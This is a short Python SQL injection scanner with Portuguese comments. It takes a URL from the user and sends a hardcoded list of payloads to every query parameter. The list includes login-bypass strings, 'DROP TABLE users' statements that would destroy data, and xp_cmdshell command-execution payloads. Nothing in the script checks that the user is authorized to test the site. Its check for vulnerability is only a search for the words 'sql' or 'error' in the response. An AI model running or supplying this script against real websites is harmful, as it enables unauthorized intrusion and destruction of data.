import requests # type: ignore
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode

print("""                 DESENVOLVEDOR: WILLIAN DE OLIVEIRA""")
# Lista expandida de payloads comuns de SQL Injection
sql_injection_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "' OR '1'='1' -- -",
    "admin' -- -",
    "'; DROP TABLE users; --",
    "'; DROP TABLE users --",
    "'; DROP TABLE users/*",
    "'; EXEC xp_cmdshell('ping 127.0.0.1') --",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')/*"
]

# Solicita a URL base do usuário
base_url = input("Digite a URL base para testar (exemplo: https://example.com): ")

def test_sql_injection(base_url, payloads):
    """
    Testa a URL alvo para vulnerabilidades de SQL Injection.
    """
    parsed_url = urlparse(base_url)
    original_params = parse_qs(parsed_url.query)

    # Para cada parâmetro existente e payload, faz uma tentativa de injeção
    for param in original_params.keys():
        for payload in payloads:
            test_params = original_params.copy()
            test_params[param] = payload

            # Reconstrói a URL com os novos parâmetros
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed_url._replace(query=test_query))

            print(f"Testando URL: {test_url}")

            # Realiza a requisição HTTP
            try:
                response = requests.get(test_url)
                if "sql" in response.text.lower() or "error" in response.text.lower():
                    print(f"Possível vulnerabilidade de SQL Injection detectada em parâmetro: {param} com payload: {payload}")
                else:
                    print(f"Parâmetro {param} com payload {payload} parece seguro.")
            except requests.RequestException as e:
                print(f"Erro ao testar {test_url}: {e}")

# Executa os testes para a URL fornecida
test_sql_injection(base_url, sql_injection_payloads)